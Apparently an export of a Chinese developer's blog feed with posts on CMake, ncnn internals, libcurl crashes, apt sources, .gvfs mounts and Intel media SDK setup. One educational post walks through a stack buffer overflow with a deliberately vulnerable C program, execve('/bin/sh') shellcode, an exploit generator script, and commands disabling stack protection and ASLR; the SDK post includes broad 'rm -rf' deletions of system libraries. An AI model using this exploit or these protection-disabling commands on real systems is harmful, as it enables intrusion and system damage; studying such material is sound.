set(CMAKE_SYSTEM_PROCESSOR arm)

set(CMAKE_SYSROOT /home/X/hisi3531d/v600_toolchains/arm-hisiv600-linux/target)
set(CMAKE_STAGING_PREFIX /home/X/libwebsockets/_install)

set(tools /home/X/hisi3531d/v600_toolchains/arm-hisiv600-linux/target)
set(CMAKE_C_COMPILER $&#123;tools&#125;/bin/arm-hisiv600-linux-gcc)
set(CMAKE_CXX_COMPILER $&#123;tools&#125;/bin/arm-hisiv600-linux-g++)

set(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)
set(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)
set(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)
set(CMAKE_FIND_ROOT_PATH_MODE_PACKAGE ONLY)


XXXConfig.cmake文件（cmake模块文件）编写以及引用
  yLibConfig.cmake

find_path(yLib_INCLUDE_DIR NAMES ylib.h PATHS @CMAKE_INSTALL_PREFIX@&#x2F;include) 

find_library(yLib_LIBRARY NAMES ylib PATHS @CMAKE_INSTALL_PREFIX@&#x2F;lib) 
#find_library 会到@CMAKE_INSTALL_PREFIX@&#x2F;lib目录查询libylib.so


set(yLib_FOUND TRUE) 
set(yLib_INCLUDE_DIRS $&#123;yLib_INCLUDE_DIR&#125;) 
set(yLib_LIBS $&#123;yLib_LIBRARY&#125;) 


mark_as_advanced(yLib_INCLUDE_DIRS yLib_LIBS )


XXX_INCLUDE_DIR


XXX_LIBRARY


XXX_FOUND


XXX_INCLUDE_DIRS


XXX_LIBS


  以上变量最好都定义了，不然find_package可能会报错
  .cmake 文件就是定义了相关include变量和lib变量，没有什么其他的东西
  调用：
set(yLib_DIR &quot;@CMAKE_INSTALL_PREFIX@&#x2F;cmake&quot;)
#设置.cmake 的目录所在
find_package(yLib REQUIRED)
#find_package会导入.cmake 中的相关变量，完成相关模块的导入


一个关于install（）指令的深坑
INSTALL(TARGETS  ylib ylib_s
    #RUNTIME DESTINATION xxx
    LIBRARY DESTINATION lib
    ARCHIVE DESTINATION lib
)
#对于RUNTIME  和 LIBRARY 两种目标，在安装时候，cmake会默认给你移除掉目标文件中的gcc的Wl,rpath的值，导致某些库找不到的错误。
以下变量会影响此坑，更详细的信息去查查别的资料，我这里就不详细说明了。
#set(CMAKE_SKIP_BUILD_RPATH FALSE)                
#set(CMAKE_BUILD_WITH_INSTALL_RPATH FALSE)        
#set(CMAKE_INSTALL_RPATH &quot;&quot;)                      
#set(CMAKE_INSTALL_RPATH_USE_LINK_PATH TRUE)    
#set(CMAKE_SKIP_INSTALL_RPATH TRUE)
#set(CMAKE_INSTALL_RPATH &quot;$&#123;CMAKE_INSTALL_PREFIX&#125;&#x2F;lib&quot;)

#set(CMAKE_SKIP_RPATH TRUE)
#set(CMAKE_SKIP_INSTALL_RPATH TRUE)
注意：cmake会直接修改你的二进制文件替换掉rpath的相关信息。默认替换的值是一个空值，也就是说移除掉了你设置的rpath的值
以上只是介绍了cmake中常见的内容，而且很多内容只涉及到一般的使用方法，某些指令还有很多其他的操作，我这里没有介绍。如果需要了解更加详细的信息，我推荐各位去看cmake 的doc。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>cmake</tag>
      </tags>
  </entry>
  <entry>
    <title>《TencentNCNN系列》 之工作原理简要解析（以LeNet-5为例）</title>
    <url>/2018/07/19/blog_idx_068/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  时间：2018.07.19
  ncnn master commit id:b3e24cafc37483dcc97ee61e6f0f6ff1b094300e
前言

  前面两篇文章我们分析了ncnn的加载参数和网络的基本工作流程。其实这一切只是为了给这篇文章做准备。因为我觉得ncnn作为一个前向框架，写的还是比较简单的，方便我们这些小菜鸟对其工作原理进行分析。而分析的方法，还是得从哪里来，从哪里去（读源码）。




前置内容（非常重要的）



本文作为例子的网络
7767517
9 9
Input            data             0 1 data 0=28 1=28 2=1
Convolution      conv1            1 1 data conv1 0=20 1=5 2=1 3=1 4=0 5=1 6=500
Pooling          pool1            1 1 conv1 pool1 0=0 1=2 2=2 3=0 4=0
Convolution      conv2            1 1 pool1 conv2 0=50 1=5 2=1 3=1 4=0 5=1 6=25000
Pooling          pool2            1 1 conv2 pool2 0=0 1=2 2=2 3=0 4=0
InnerProduct     ip1              1 1 pool2 ip1 0=500 1=1 2=400000
ReLU             relu1            1 1 ip1 ip1_relu1
InnerProduct     ip2              1 1 ip1_relu1 ip2 0=10 1=1 2=5000
Softmax          prob             1 1 ip2 prob 0=0



ncnn的基本调用流程
#include "net.h"
ncnn::Net abc_net;
ncnn::Mat in_img;
ncnn::Mat out_img;

abc_net.load_param(param_path);
abc_net.load_model(model_path);

ncnn::Extractor ex = abc_net.create_extractor();

ex.set_num_threads(4);
ex.set_light_mode(true);

ex.input("data", in_img);

ex.extract("prob", out_img);
  这里简要说明一下：
    前两篇文章分别介绍了load_param load_model的基本工作原理，这里要介绍的就是剩下的所有内容。


相关数据结构准备（此小节内容可作为前两篇文章的内容补充）
  在load_param时：
    ncnn::Net::blobs存放着每一个blob的相关信息，主要信息为name、producer、consumers，含义分别为：名字、产生这个blob数据的层、消费这个blob数据的层。
  ncnn::Net::layers存放的是：


ncnn::Net::layers::type


ncnn::Net::layers::name


ncnn::Net::layers::bottoms 存的是此层需要的输入blob的idx


ncnn::Net::layers::tops 存的是此层输出的blob的idx


  在load_param中会根据我们读入的type来create_layer，这里建立这个layer也挺有意思的。

    
        
    
    

    
        
    
    
//这里的layer_to_index会去layer_registry去查找对应的层类型的idx，这里的layer_registry数组是我们在编译ncnn的时候初始化的，里面存放的是如下的东西。
#if NCNN_STRING
&#123;"Convolution",Convolution_x86_layer_creator&#125;,
#else
&#123;Convolution_x86_layer_creator&#125;,

//这个数组的作用就是用来查询具体层的idx和其提供的构造接口creator。每个层都会实现这个creator，比如Convolution层在x86架构下，其构造接口名字叫做Convolution_x86_layer_creator。其原理如下：
DEFINE_LAYER_CREATOR(Convolution_x86)//通过宏定义Convolution_x86_layer_creator这个全局函数
#define DEFINE_LAYER_CREATOR(name) \
    ::ncnn::Layer* name##_layer_creator() &#123; return new name; &#125;


以前文网络为例分析
  这里的分析入口为:
    ncnn::Extractor::input()

    
        
    
    
//图中blob_mats 就是整个框架工作时的数据存放向量。
std::vector&lt;Mat> blob_mats;//blob_mats 定义


//blob_mats的大小初始化在ncnn::Net::create_extractor()中完成,这里唯一需要注意的是，此函数是类Extractor的友元类成员函数，这样写的原因是为了访问其protect的构造函数。
Extractor Net::create_extractor() const
&#123;
    return Extractor(this, blobs.size());
&#125;
Extractor::Extractor(const Net* _net, int blob_count) : net(_net)
&#123;
    blob_mats.resize(blob_count);
    lightmode = true;
    num_threads = 0;
&#125;

//find_blob_index_by_name 就是在ncnn::Net::blobs中去循环遍历，得到其idx。
//然后把输入的mat数据，放入到blob_mats中相应的位置去。到这里，输入数据就填充完了。
    ncnn::Extractor::extract()

    
        
    
    
//此调用的开始时，根据名字通过find_blob_index_by_name 查找我们需要的输出层的idx，然后把blob_mats(携带输入数据)、lightmode、我们需要的输出层的idx一起传入给ncnn::Net::forward_layer()。然后将上述调用处理好的数据放入feature返回。一个网络的前向计算就完成了。
    ncnn::Net::forward_layer()

    
        
    
  
  上图这个if语句是这层网络只有一个输入和输出

    
        
    
  
  此图的else是这层网络非一个输入和输出
//这里我只分析只有一个输入和输出的情况，另外一种和它非常相近。
//图中line 637-line 642,这里通过递归调用一层层倒推回去，直到我们的网络输入层。因为这一层在input的时候给blob_mats赋值，其dims不为零。

//图中line646-line 655是set_light_mode的作用，其作用为是否释放计算过程中，存入blob_mats中，在前面层计算的得到的数据

//图中line 658-line 691是开始前向计算。这里的计算分为两类，一类是在输入数据上计算，并把输出数据放入到输入数据的变量中。另外一种就是分别传入两个变量，一个存输入，一个存输出。至于为啥这样写，不知道，节约内存？

//后续只会分析一种情况，分别传入两个变量，一个存输入，一个存输入。这里以前文网络中的第二层Convolution层为例。在line 677-line 690中，layer->forward()就是执行具体层的计算。
    ncnn::Convolution::forward()

    
        
    
  
//这里只分析kernel为1*1*1的这种卷积
//这里构造了一个InnerProduct层操作，这里简短的几句话，其实就是我前面几篇文章中的部分内容，load_param做了什么，load_model做了什么
    ncnn::InnerProduct::forward()

    
        
    
  
  这里核心是计算两个向量的内积。
  到这里为止，一个卷积操作就完成了。然后forward_layer会从递归中一级级返回，最后得到我们需要的那一层的值。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>DL</category>
      </categories>
      <tags>
        <tag>DL</tag>
        <tag>ncnn</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 上 libcurl库 curl_easy_perform Crash(signal 11 - SIGSEGV)</title>
    <url>/2018/10/10/blog_idx_071/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  system info :Linux 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
前言

  无




安装libcurl的方法

sudo apt install libcurl4-openssl-dev  libcurl3




实际遇到的问题

  在一个ARM_Linux的程序中，涉及到用curl_easy_perform上传json数据到后台和用curl_easy_perform模拟表单上传带图片和文件的数据。
  在上传的过程中，出现了让人费解的情况：在上传json数据的时候一切正常，但是上传带图像的表单数据的时候，出现了访问非法地址的问题（signal 11 - SIGSEGV）。




网上的一系列可能导致此问题的原因



curl_global_init()和curl_global_cleanup() 调用线程不安全，可能会导致程序异常退出，需要注意。


多线程环境下，https请求时，由于libopenssl 不支持多线程，出现crash，这里需要在调用libcurl之前，先设置openssl的 互斥锁 回调接口，这样才能保证线程安全。


libcurl库的debug和release混用的问题，就是说release程序用release库，debug程序用debug库。






结论

  经过测试，发现就是第三个原因导致的我程序崩溃，可是为何debug和release只对在上传表单的时候crash起作用，而在post上传普通数据的时候无异常？这里就留个有缘人去测试吧，希望哪个大佬，找出原因了告诉我！！！




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>libcurl</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 的源相关介绍（最近在配gstreamer的时候,紧急补充的知识）</title>
    <url>/2018/09/10/blog_idx_070/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  System:Linux tegra-ubuntu 4.4.38-tegra #1 SMP PREEMPT Fri Jul 28 09:55:22 PDT 2017 aarch64 aarch64 aarch64 GNU/Linux
前言

  无




什么是源

  源是一个在网络上的软件仓库，这里面存放着各种各样的软件安装包。在我们使用Linux系统的过程中，往往需要安装一些自己需要的软件，这些软件大部分由相关人员打包好了，存放到软件仓库中。在我们个人的Linux系统上，有着一种工具叫做包管理器，专门用来下载和安装我们需要的软件，并且提供自动补全依赖功能。列如：apt,yum,dnf,dpkg。
  下面以debian系的Ubuntu为例，对源和这些工具的关系做一个简单介绍。




客户端—源

  在ubuntu上，在/etc/apt/sources.list目录中，存放了关于源的网络地址和软件仓库名。列如：
# See http://help.ubuntu.com/community/UpgradeNotes for how to upgrade to
# newer versions of the distribution.

deb http://ports.ubuntu.com/ubuntu-ports/ xenial main

deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial main
#deb http://ports.ubuntu.com/ubuntu-ports/ xenial main restricted
#deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial main restricted

## Major bug fix updates produced after the final release of the
## distribution.
deb http://ports.ubuntu.com/ubuntu-ports/ xenial-updates main restricted
deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial-updates main restricted

## Uncomment the following two lines to add software from the 'universe'
## repository.
## N.B. software from this repository is ENTIRELY UNSUPPORTED by the Ubuntu
## team. Also, please note that software in universe WILL NOT receive any
## review or updates from the Ubuntu security team.
 deb http://ports.ubuntu.com/ubuntu-ports/ xenial main universe
 deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial main universe
# deb http://ports.ubuntu.com/ubuntu-ports/ xenial-updates universe
# deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial-updates universe

## N.B. software from this repository may not have been tested as
## extensively as that contained in the main release, although it includes
## newer versions of some applications which may provide useful features.
## Also, please note that software in backports WILL NOT receive any review
## or updates from the Ubuntu security team.
# deb http://ports.ubuntu.com/ubuntu-ports/ xenial-backports main restricted
# deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial-backports main restricted

deb http://ports.ubuntu.com/ubuntu-ports/ xenial-security main restricted
deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial-security main restricted
# deb http://ports.ubuntu.com/ubuntu-ports/ xenial-security universe
# deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial-security universe
# deb http://ports.ubuntu.com/ubuntu-ports/ xenial-security multiverse
# deb-src http://ports.ubuntu.com/ubuntu-ports/ xenial-security multiverse

  首先，debian系的软件包的格式为deb格式。这里的deb deb-src分别代表deb包和deb包对应的源码的地址和仓库。


deb和deb-src格式介绍(具体可参考ubuntu官方文档)：


http://xxxx为对应的网络地址


xenial 对应的是ubuntu的系统版本代号，这里为16.04


security,backports,updates,preposed 对应的是ubuntu大的系统版本号中的小版本，我们基本只会用到前面两个。相关介绍：它们分别对应的是安全更新（影响系统性能），后备更新（在ubuntu大版本冻结时，所有对应软件的功能也定型了，后续只会修复bug，哪怕相关软件更新了功能，但是此版本ubuntu不提供新功能，这个小版本就是提供这些软件的新版本的），普通更新（不影响系统性能），预备更新（说白了就是security,updates的beta测试版本，验证稳定后，进入security，updates）。


main,universe,restricted,multiverse 版权限定。他们分别是官方维护的自由软件，社区维护的自由软件，设备驱动，非自由软件，但是可免费使用。


  总的格式为：


deb 网络地址 系统代号(大版本)-小版本 版权限定


deb-src 网络地址 系统代号(大版本)-小版本 版权限定






客户端—源

  打开一个ubuntu的源，可能如下图：

    
        
    
  
  这里有两个文件夹是我们经常用到的，一个是dists，一个是pool，其他的文件及文件夹一般人不会用到。


dists文件夹：
  分版本，版本限定以及架构存放的软件包的信息，例如下面的这些图：

    
        
    
  
  这里的压缩包里面存放的就是这个仓库的软件信息，有需求可以下载下来分析，里面包含很多有用的信息。（其实我们apt update下载下来的东西就是这个）


pool文件夹：
  里面是所有的包存放的物理地址，这些物理地址的引索在dists文件夹中的压缩包中有。所以直接可以apt install 下载下来，通过dpkg安装。
  pool里面的包也是按照包首字母和版权限定存放的。
  列如包：gstreamer1.0-plugins-ugly
  在ubuntu的软件包搜索中，查找gstreamer1.0-plugins-ugly,找到后，切换到下载页面，可见gstreamer1.0-plugins-ugly的实际下载路径，如下图，意思是在某源的pool/universe/g/gst-plugins-ugly1.0/ 目录下，如图：

    
        
    
  

    
        
    
  
  这样我就找到了这个包
注意：如果通过apt 无法安装某些软件，并且你在ubuntu软件包中搜索到了，请打开对应的限定源并更新即可下载。
服务端—源 常见的有几种


ubuntu 官方源


ppa（Personal Package Archives）






后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>软件源</tag>
      </tags>
  </entry>
  <entry>
    <title>.gvfs 文件夹 异常</title>
    <url>/2018/10/11/blog_idx_072/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  system info ：Linux  27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
前言

  无




问题起因

  忘了留截图了。在用winscp传输文件的过程中，突然我去刷新某目录时，出现一个错误，大概是说无法获取.gvfs 的属性。导致目录显示不完，也就是没有刷新完就停止了。于是我去终端看了一下此文件夹的属性，属性如下：
d???  ? ?    ?        ?             ? .gvfs/
  然后我直接懵逼了，因为我真的是第一次看见这个权限和属性，还有这种操作？




问题原因

  然后尝试 rm -rf ， chmod, chown ,lsof, fuser 都报错的报错，不行的不行。于是乎去bd上冲了一波浪，有点眉目了，貌似是FUSE（Filesystem in Userspace）的一个bug。但是有点不全面，于是又去gg上冲了一波浪。然后找到了相关的答案：


FUSE是在用户态实现了一个文件系统，此文件系统作用是把其他网络文件系统或者其他协议文件系统挂载到用户空间。而且，FUSE由于是自己构建文件系统，我们可以设置此文件必须由创建者访问，排除其他所有用访问，包括root。这就尴尬了。


而gvfs 是GNOME桌面系统的虚拟文件系统，而此虚拟文件系统是用FUSE实现的。gvfs作用就是你在桌面上点击smb、ftp、sftp等链接地址是，会直接挂载相关的文件系统到本地。而.gvfs 就是这些文件系统的挂载点。






解决方案

  由于知道了是gvfs 创建的挂载点，那么通过umount 卸载此挂载点即可。然后可对.gvfs 文件夹进行任何操作了。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>Ubuntu使用</category>
        <category>常识</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
        <tag>gvfs</tag>
      </tags>
  </entry>
  <entry>
    <title>x86架构的内存溢出攻击原理演示(加强对计算机运行原理的理解，说明内存溢出的危害)</title>
    <url>/2018/12/06/blog_idx_074/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  本文仅用于学习计算机程序运行原理，请不要用作其他违法用途。
  内存溢出可以说是我们程序员经常遇到的问题了，但是一般过程中，我们只会处理让程序崩溃的内存溢出，只要程序不崩溃，我们基本不会管的了。这里，我将会演示一下程序内存溢出的严重后果。同时也警示我们自身，写程序一定要逻辑严密一点，不要犯低级错误。（然而我们不可能避免错误，只要没有比较明显的错误即可。）




前置知识（64bit）



汇编中的几个重要指令:
  汇编中的几个重要指令:


call xxx 等价于：push eip 和 jump xxx


leave 等价于:  pop rbp 和 mov rbp,rsp


ret 等价于 pop eip




栈帧的知识：
  参考我之前的文章：https://blog.csdn.net/u011728480/article/details/79092194
  简单说就是,跳转到一个子过程，会又一片新的内存区域，有三个重要的寄存器rbp，rsp，eip 可以表示和这个区域的属性。看下图：(在调用一个子过程的时候，注意rsp，rbp，eip的变化，新的rsp和rbp的生成，新老rsp和rbp的关系)

    
        
    
  
  注意：每个子调用的完整过程为:这里面包含了所有的rbp,rsp，eip的变化
call sub_call       ; eip入栈，rsp-8
push rbp		 ; rbp 入栈  rsp-8
mov rsp,rbp        ; rsp 赋值给rbp，作为一个新的栈帧开始，rbp为栈底
... ...                    ;这里就是子调用的变量内存分配，rsp-0xN
... ...			 ;其他过程
... ...                    ;其他过程
leave                  ;rbp赋值给rsp, rbp出栈，rsp+8
ret                       ;eip出栈，rsp+8
  这样的一个过程，就完成了现场调整执行子调用然后恢复现场的过程。




内存溢出的攻击的简要原理（以上图为例）

  x86栈帧是从高地址到低地址的排列的。如果我在sub_func中分配了0xN字节的buf，那么上图的rbp’和rsp’的关系变为rbp’=rsp’+0xN，如果没有做安全的内存使用，我直接写入了0xN+8+8的数据，理论上来说，我就覆盖了上图栈中eip的值，eip存放的是sub_func返回时，要执行Main_Func下一条指令的地址，也就是说，我控制了，sub_func返回时要执行的地址内容，那么通过精心构造的内容，如果写入到buf，就可能执行我们想要的代码。
  那么是不是内存溢出很简单呢？操作系统难道那么不安全吗？




现代内存堆栈保护技术出现



编译器堆栈检测


堆栈不可执行


地址空间随机化等等


  这些东西都可以提高内存溢出的难度，我是一个小白，为了理解内存攻击，我得把他们关闭了。




内存溢出攻击实例



1 准备一份shellcode，就是上面替换eip后，你想要执行的一份代码。我这里选择，生成一个shell。
  对应的16进制：
\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
  c版本
//       int execve(const char *filename, char *const argv[],char *const envp[]);
const char * a = "/bin/sh";
char * b[1];
b[0] = a;
execve(a, b, NULL);
  汇编版本（64位，注意）
xor eax, eax ; 清空eax
mov rbx, 0xFF978CD091969DD1 ; 0x6873276e69622f的补码
neg rbx;对rbx求补码，rbx&#x3D;0x6873276e69622f,代表hs&#x2F;nib&#x2F;
push rbx;把&#x2F;bin&#x2F;sh的地址放入栈，rsp-8
push rsp;rsp放入堆栈，rsp-8
pop rdi;把&#x2F;bin&#x2F;sh的地址给rdi，rdi作为作为参数参数的第一个参数，在64系统中，rsp+8
cdq;把edx的每一位设置为eax的最高位，就是edx清零，然后把edx作为eax的高位。
push rdx;内存地址高8字节rsp-8
push rdi;内存地址低8字节，指向&#x2F;bin&#x2F;sh,rsp-8
push rsp;保存rsp,rsp-8
pop rsi;rsi&#x3D;新构造的一个变量地址。指向&#x2F;bin&#x2F;sh,rsp+8
mov al, 0x3b;设置系统调用号0x3b execv
syscall;系统调用
  64位系统,execve的系统调用号为59，也就是0x3b

    
        
    
  


2 实际实例攻击
  异常代码
#include &lt;string.h>
#include &lt;stdio.h>
#include &lt;sys/types.h>
#include &lt;sys/stat.h>
#include &lt;fcntl.h>
#include &lt;unistd.h>


void overflow(char * msg)&#123;

	char buf[10];
	memcpy(buf, msg, 100);
	printf("buf out: %s", buf);
&#125;

int main(int argc, char * argv[])&#123;

	char main_buf[100];
	int f = open(argv[1], O_RDONLY);
	read(f, main_buf, 100);
	overflow(main_buf);
	return 0;
&#125;
  exp 辅助生产工具，生成exp文件，python exp.py&gt;msg
  exp.py 文件内容
#!/usr/bin/python

import struct
from subprocess import call

addr=0x7fffffffDE5B

s_c="\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buf="M"*10
buf+="M"*8
buf+=struct.pack("&lt;I",0xffffde30) #main rbp
buf+=struct.pack("&lt;I",0x7fff) #main rbp
buf+=s_c
def str_to_hex(s):
	return ''.join([hex(ord(c)).replace('0x', '\\x') for c in s])
print buf
#call(["./a.out",buf])

  编译方法，去掉堆栈保护，设置堆栈可执行
gcc test.cpp -l stdc++ -z execstack -fno-stack-protector 
  关闭地址随机化（必须root用户情况下）：
echo 0 > /proc/sys/kernel/randomize_va_space 
  效果：

    
        
    
  
  至此我们成功拿到了shell，可以做一些简单的shell操作等等。




以上实例分析

  根据上文overflow源码分析得出，我们溢出了90个字节，由于程序员的不小心。这100个字节是来至于文件的，我们可以构建一个特殊的文件来达到我们的目的。
  根据exp助手，我们可以生成一个创建shell的exp文件。
根据exp助手源码可知：
1-10字节为M     ------    这对应我们申请的buf内容
11-18字节为M     ------   这对应在子过程调用中，push rbp时，保存的原有的rbp
19-26字节为eip在栈中的位置   ------ 这就是我们要修改当overflow返回时，我要计算机执行的我的代码的地方，也就是shellcode中的xor eax,eax
27-54字节即为创建shell的shellcode
  如果我们在overflow中申请的buf地址为N，那么：
N~N+0xa 为buf的内存空间
N+0xb~N+0x12 为原rbp保存的位置
N+0x13~N+0x1a 为我们需要控制的eip的值，需要让他指定到我们想要的地址去，明显我们想要的地址就是N+0x1b，也就是我们创建shell的汇编存放的地方
N+0x1b~N+0x36 为我们存放创建shell汇编代码的存放的地方。
  从上述分析可知：
    我们需要改的就是N+0x13~N+0x1a内存中存放的值，改为N+0x1b.
  在操作系统中：当我们关闭的地址虚拟化后，我们的程序在开机的过程中，每次运行的时候，基地址的一致的，这样我们每次运行的时候，我们的buf地址是一致，当我们获取了buf地址后，即可生成exp文件。
  我们通过core文件和gdb来找到buf的地址如下图：
  先运行./a.out msg
  这个时候msg的地址可以乱填，反正会段错误。得到core文件
  在运行 gdb --core=core
  这个时候查看几个寄存器的值，唯一的有效值是rsp的值如下图：

    
        
    
  
  通过分析，发现是执行完leave 指令，并且执行完ret指令，eip中的值为我随意设定的一个乱的值。
  这里我们就知道，rsp的值即为我们的想要的shellcode，rsp的地址即为我们想要的地址，把这个地址放到exp助手里面去，然后重新生成exp文件，然后就得到了我们想要的结果。




总结


这告诉我们程序员，在写代码时，特别是有重大用处的程序时，要注意内存溢出问题，不可能有那么明显的溢出，但是有很多隐藏溢出地方，这个需要大家注意。


计算机还是一如既往的笨。


这是最经典的内存溢出攻击方式，现代的溢出攻击万变不离其宗。


本文主要是为了学习计算机中程序执行的原理，请不要用于非法用途。




后记

  无
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 14.04 Intel 处理器 硬编解码配置(Intel® Media Server Studio)</title>
    <url>/2018/10/17/blog_idx_073/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  system-info :Linux  #1 SMP Wed Oct 17 12:06:29 CST 2018 x86_64 x86_64 x86_64 GNU/Linux
  cpu-info:Intel® Core™ i7-6498DU CPU @ 2.50GHz
前言

  无




2018/11/7重大更新

  由于今天对另外一个板子安装sdk然后进行硬解码，但是，出现的问题是，所有驱动、内核都正常加载，但是vainfo测试异常。查了半天，才发现是当前sdk 版本不支持当前版本的cpu。所以这里附上精心查找的sdk版本能支持的cpu设备列表。


Intel Media SDK 版本所支持的设备列表

    
        
    
    


Intel® Media Server Studio *版本所支持的设备列表

    
        
    
 


不用感谢我，此图呕心沥血奉上！！！！！！（藏的巨深，气啊！）




Intel® Media Server Studio

  Intel 媒体服务解决方案。https://software.intel.com/en-us/intel-media-server-studio




下载Intel® Media Server Studio Community Edition



注册intel账号，他要验证几天，反正我是第二天收到验证通过的消息。



    
        
    
 


然后下载得到一个压缩包。名字类似：MediaServerStudioEssentials2017R3.tar.gz






准备安装Intel® Media Server Studio Community Edition



上传MediaServerStudioEssentials2017R3.tar.gz到开发板子。并解压！


进入MediaServerStudioEssentials2017R3目录，解压SDK2017Production16.5.2.tar.gz


进入SDK2017Production16.5.2目录，里面包含两个版本的sdk，一个是centos（intel recommend），另外一个是普通的linux SDK，此外，此目录你需要打开media_server_studio_getting_started_guide.pdf文档，参考里面的安装说明。目录如下：



    
        
    
 


接下来就是基本操作了，按照别人的pdf做相应的事情。






开始安装Intel® Media Server Studio Community Edition



修改当前登录用户的所属附加群组


usermod -a -G video username


检查系统是否识别到intel vga 适配器


lspci -nn -s 0:02.0

    
        
    
 
&emsp;&emsp;图中的vid:1906不需要和我的一致。


在文档中提供了一般的linux系统安装sdk的脚本。但这里我推荐一条一条的执行方便排错。


删除其他的libva（接入显卡api处理图像的库） libdrm(用户态显卡调用api) 并清除之前的历史安装的sdk


echo "remove other libdrm/libva"
find /usr -name "libdrm*" | xargs rm -rf
find /usr -name "libva*" | xargs rm -rf

echo "Remove old MSS install files ..."
rm -rf /opt/intel/mediasdk
rm -rf /opt/intel/common
rm -rf /opt/intel/opencl


解压依赖包,复制相关文件到系统目录,添加库目录到ldconfig配置（需要超级权限）


echo "install user mode components"
#unpack the generic package
tar -xvzf intel-linux-media_generic*.tar.gz
tar -xvJf intel-opencl-cpu-*.tar.xz
tar -xvJf intel-opencl-devel-*.tar.xz
tar -xvJf intel-opencl-r*.tar.xz
#put the generic components in standard locations
/bin/cp -r etc/* /etc
/bin/cp -r lib/* /lib
/bin/cp -r opt/* /opt
/bin/cp -r usr/* /usr
#ensure that new libraries can be found
echo '/usr/lib64' > /etc/ld.so.conf.d/libdrm_intel.conf
echo '/usr/local/lib' >> /etc/ld.so.conf.d/libdrm_intel.conf
ldconfig


安装内核编译依赖


echo "install kernel build dependencies"
apt-get -y install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc g++
注意如果ncurses-dev找不到，则用libncurses5-dev


下载4.4.0内核，并解压，然后打补丁


wget https://www.kernel.org/pub/linux/kernel/v4.x/linux-4.4.tar.xz
tar -xJf linux-4.4.tar.xz
echo "apply kernel patches"
cp /opt/intel/mediasdk/opensource/patches/kmd/4.4/intel-kernel-patches.tar.bz2 .
tar -xvjf intel-kernel-patches.tar.bz2
cd linux-4.4
